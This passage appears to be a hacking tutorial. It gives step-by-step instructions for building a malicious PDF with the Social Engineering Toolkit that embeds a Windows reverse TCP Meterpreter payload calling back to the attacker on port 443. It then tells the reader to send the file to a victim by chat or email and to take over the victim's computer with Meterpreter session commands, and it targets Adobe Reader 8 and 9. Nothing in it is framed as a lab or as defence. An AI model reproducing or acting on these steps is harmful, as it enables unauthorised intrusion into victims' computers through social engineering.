Now choose 11 “Adobe PDF Embedded EXE Social Engineering” to load all vulnerability Social Engineering Toolkit known. These tools will launch all exploit in Social Engineering Toolkit database. 

Now choose 2, “Use built-in BLANK PDF for Attack”

Now choose 2 “Windows Reverse_TCP Meterpreter”, but you have several to choose from including your own program.

Connect back port to attacker computer. In this example I use port 443, but you can change to 1456, 4521, etc. After we successfully generate the malicious PDF File, it will store on your local computer.

Now send your template.pdf files to victim via chat or email or any social engineering technique as soon as they download and open it. Now you can access meterpreter shell on victim computer.

Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“

Note: This trick works when victim is using any version of Adobe PDF reader 8 or 9
